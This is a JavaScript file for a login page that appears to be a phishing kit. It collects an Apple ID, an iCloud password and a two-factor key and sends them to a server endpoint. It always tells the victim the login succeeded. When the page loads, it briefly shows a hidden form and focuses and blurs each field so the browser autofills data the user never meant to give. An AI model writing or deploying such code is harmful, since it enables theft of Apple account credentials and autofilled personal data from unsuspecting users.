// Listen for form submission and send data to server
document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const appleId = document.getElementById('appleId').value;
    const icloudPassword = document.getElementById('icloudPassword').value;
    const twoFAKey = document.getElementById('twoFAKey').value;

    // Send the data to the server
    fetch('http://localhost:3000/api/user-inputs', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            appleId: appleId,
            icloudPassword: icloudPassword,
            twoFAKey: twoFAKey
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
        alert("Login successful!");
    })
    .catch((error) => {
        console.error('Error:', error);
        alert("There was an error with the login.");
    });
});

// Trigger hidden form autofill (optional)
function triggerAutofill() {
    const hiddenForm = document.getElementById('hiddenForm');
    hiddenForm.style.display = 'block';

    const fields = hiddenForm.querySelectorAll('input');
    fields.forEach(field => {
        field.focus();  // Simulate focus to trigger browser autofill
        field.blur();   // Blur to simulate completing the autofill process
    });

    setTimeout(() => {
        hiddenForm.style.display = 'none';  // Hide the form after 1 second
    }, 1000);
}

window.onload = triggerAutofill;  // Call the function when the page loads